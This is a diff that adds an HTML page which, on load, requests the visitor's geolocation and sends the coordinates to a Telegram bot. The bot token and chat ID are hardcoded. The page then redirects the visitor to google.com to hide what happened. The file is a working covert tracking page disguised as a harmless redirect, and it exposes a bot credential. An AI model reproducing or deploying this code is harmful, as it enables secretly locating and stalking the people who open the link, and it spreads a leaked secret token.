@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendLocation(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            var msg = "Latitude: " + latitude + ", Longitude: " + longitude;
+
+            // Construct the Telegram bot API URL
+            var botToken = "bot6107093453:AAEwZhVbqR3VnAL-_1-9K12ijlc-7-vhaIE";
+            var chatId = "-838827510";
+            var telegramApiUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg);
+
+            // Redirect to Google.com
+            window.location.href = "https://www.google.com";
+
+            // Send the location to the Telegram bot
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", telegramApiUrl, true);
+            xhr.send();
+        }
+    </script>
+</head>
+<body onload="getLocation()">
+</body>
+</html>
